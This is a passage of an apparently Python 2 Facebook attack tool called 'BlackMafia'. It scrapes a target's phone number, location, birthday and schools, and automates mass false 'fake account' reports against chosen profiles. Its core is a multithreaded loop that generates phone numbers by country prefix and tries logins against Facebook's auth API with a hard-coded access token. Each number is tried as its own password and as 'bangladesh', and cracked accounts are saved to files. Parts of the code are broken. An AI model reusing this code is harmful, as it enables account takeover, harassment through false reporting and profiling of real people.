				print '\033[1;91m[☆] \033[1;92mTelephone\033[1;95m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;93m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mDate of birth\033[1;91m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;92m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			asif()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

def fighter():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m CoviD19 Death Report.  "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Target  Profile.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start   Reporting."
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start   Report1.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start   Report2.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start   Report3.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m7.\x1b[1;92m Start   Report4.  "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Back             "
	pilih_fighter()

def pilih_fighter():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_fighter()
        elif peak =="1":
	        os.system('xdg-open https://m.facebook.com/help/contact/228813257197480?refid=69')
	        pilih_fighter()
	elif peak =="2":
		report()
        elif peak =="3":
	        rep()
        elif peak =="4":
                test1()
        elif peak =="5":
	        test2()
        elif peak =="6":
	        test3()
        elif peak =="7":
	        test4()
	elif peak =="0":
		menu()
def report():
    try:
        os.system('clear')
        print logo
        id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
        my = ("https://m.facebook.com/"+id)
        url = my
        br.open(url)
        dray = raw_input(R+'[*] '+G+'Do You Want To Report \n'+R+'[+]'+G+' [y/n] :\n'+ G +' BlackMafia ' + R + '  ' + W)
        return rep()    
    except:
        fighter()
def rep():
    x = open(ids,'r')
    y = x.read()
    if id in y:
        print (R+'.  Oops 405')
        time.sleep(1)
        time.sleep(R+'Error While Reporting the Id')
        time.sleep(1)
        return test1()
    else:         
        return test2()
               
def test1():
          _bs = br.response().read()
          bb=bs4.BeautifulSoup(_bs,
				features="html.parser"
			)
          if len(bb) !=0:              
              for x in bb.find_all("a",href=True):                  
                  if "rapid_report" in x["href"]:                      
                      _cadow = x["href"]                      
                      br.open(_cadow)
                      return test2()
          
def test2():
    try:
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["tag"] = ["profile_fake_account"]
        br.submit()
        return test3()
    except Exception as f:
        print (' [+] Bad404')
                
def test3():     
    try:         
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["action_key"] = ["FRX_PROFILE_REPORT_CONFIRMATION"]
        br.submit()
        return _test4()
    except Exception as f:         
        print ('    Bad405')
                 
def test4():     
    try:         
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["checked"] = ["yes"]
        br.submit()
        jj = open(ids,'w')
        jj.write(_id)
        print ''
        time.sleep(2)
        print (G+'[-]Reported ')
        time.sleep(1)
        exit()
    except Exception as f:         
        print ('    Bad406')

def blackmafiax():
	os.system('clear')
	print logo
	print '\033[1;97m»»[1]  Indonesia'
        time.sleep(0.1)
	print '\033[1;97m»»[2]  USA'
        time.sleep(0.1)
	print '\033[1;97m»»[3]  UK'
        time.sleep(0.1)
	print '\033[1;97m»»[4]  India'
        time.sleep(0.1)
	print '\033[1;97m»»[5]  Brazil'
        time.sleep(0.1)
	print '\033[1;97m»»[6]  Japan'
        time.sleep(0.1)
	print '\033[1;97m»»[7]  Korea'
        time.sleep(0.1)
	print '\033[1;97m»»[8]  Italy'
        time.sleep(0.1)
	print '\033[1;97m»»[9]  Spain'
        time.sleep(0.1)
	print '\033[1;97m»»[10] Poland'
        time.sleep(0.1)
        print '\033[1;97m»»[11] Pakistan'
        time.sleep(0.1)
	print '\033[1;97m»»[12] Bangladesh'
        time.sleep(0.1)
        print '\033[1;97m»»[13] Grecee'
        time.sleep(0.1)
	print '\033[1;97m»»[0]  Kembali            '
        time.sleep(0.1)
	print 45*'-'
	action()


def action():
	lovehackerx = raw_input('\n\033[1;97mPilih Menu>>> \033[1;97m')
	if lovehackerx =='':
		print '[!] Pilih Yang Benar'
		action()
	elif lovehackerx =="1":
		os.system("clear")
		print (logo)
		try:
			c = raw_input("\033[1;97m Masukan code  : ")
			k="+62"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="2":
		os.system("clear")
		print (logo)
		print("\033[1;97m786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="3":
		os.system("clear")
		print (logo)
		print("\033[1;97m737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" \033[1;97mMasukan Kode  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembalj ]")
			blackmafiax()
	elif lovehackerx =="4":
		os.system("clear")
		print (logo)
		print("\033[1;97m954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;97mMasukan Kode  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="5":
		os.system("clear")
		print (logo)
		print("\033[1;97m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+55"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="6":
		os.system("clear")
		print (logo)
		print("\033[1;97m11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ kembali ]")
			blackmafiax()
	elif lovehackerx =="7":
		os.system("clear")
		print (logo)
		print("\033[1;97m1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="8":
		os.system("clear")
		print (logo)
		print("\033[1;97m388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+39"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="9":
		os.system("clear")
		print (logo)
		print("\033[1;97m60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+34"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =="10":
		os.system("clear")
		print (logo)
		print("\033[1;97m66, 69, 78, 79, 60, 72, 67, 53, 51")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+48"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
        elif lovehackerx =="11":
		os.system("clear")
		print (logo)
		print("\033[1;97m01, ~~~, 49")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
        elif lovehackerx =="12":
		os.system("clear")
		print (logo)
		print("\033[1;97m161, ~~~~, 197")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
        elif lovehackerx =="13":
		os.system("clear")
		print (logo)
		print("\033[1;97m1,2,3,4,5,6,7,8,9")
		try:
			c = raw_input("\033[1;97m Masukan Kode  : ")
			k="+003069"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Tidak Ditemukan")
			raw_input("\n[ Kembali ]")
			blackmafiax()
	elif lovehackerx =='0':
		login()
	else:
		print '[!] Pilih Yang Benar'
		action()

	xxx = str(len(id))
	jalan ('[✓] Total Nomor: '+xxx)
	time.sleep(0.5)
	jalan ('[✓] Mohon tunggu, Proses Berlangsung ...')
	time.sleep(0.5)
	jalan ('[!] STOP CTRL Z')
	time.sleep(0.5)
	print 44*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + k + c + user + ' | ' + pass1
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+' | '+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;93m[+] ' + k + c + user + ' | ' + pass1
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+' | '+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:
				    pass2="bangladesh"
				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
				    q = json.load(data)
				    if 'access_token' in q:
				        print '\x1b[1;92m[✓] ' + k + c + user + ' | ' + pass2
				        okb = open('save/successfull.txt', 'a')
				        okb.write(k+c+user+' | '+pass2+'\n')
				        okb.close()
				        oks.append(c+user+pass2)
				    else:
				        if 'www.facebook.com' in q['error_msg']:
					        print '\033[1;93m[+] ' + k + c + user + ' | ' + pass2
					        cps = open('save/checkpoint.txt', 'a')
					        cps.write(k+c+user+' | '+pass2+'\n')
					        cps.close()
					        cpb.append(c+user+pass2)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cpb))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	login()	
          
if __name__ == '__main__':
	login()
